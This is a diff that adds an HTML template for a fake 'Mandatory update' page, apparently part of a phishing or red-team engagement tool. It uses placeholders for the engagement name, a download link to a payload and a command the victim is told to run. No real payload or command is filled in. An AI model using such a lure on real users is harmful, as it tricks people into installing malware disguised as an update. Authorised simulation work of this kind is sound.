@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<title>Mandatory update</title>
+<style>
+ body {{ background:#101014; color:#e8e8ef; font-family: system-ui, sans-serif;
+        margin:0; padding:3rem; }}
+ .card {{ max-width:40rem; margin:auto; border-radius:14px; padding:2rem;
+          background:#1a1a22; border:1px solid #3a3a4a; }}
+ a.button {{ display:inline-block; margin-top:1rem; padding:.7rem 1.2rem; border-radius:8px;
+             background:#4f8cff; color:#04101f; text-decoration:none; font-weight:600; }}
+ code {{ background:#26262f; padding:.15rem .4rem; border-radius:4px; }}
+</style></head>
+<body><div class="card">
+ <h2>Update required</h2>
+ <p>Your client ({engagement}) must be updated to continue. Download the package
+    below, then run <code>{command}</code>.</p>
+ <p><a class="button" href="/{payload}">Download the update</a></p>
+ <p><small>{reference} · {generated}</small></p>
+</div></body></html>
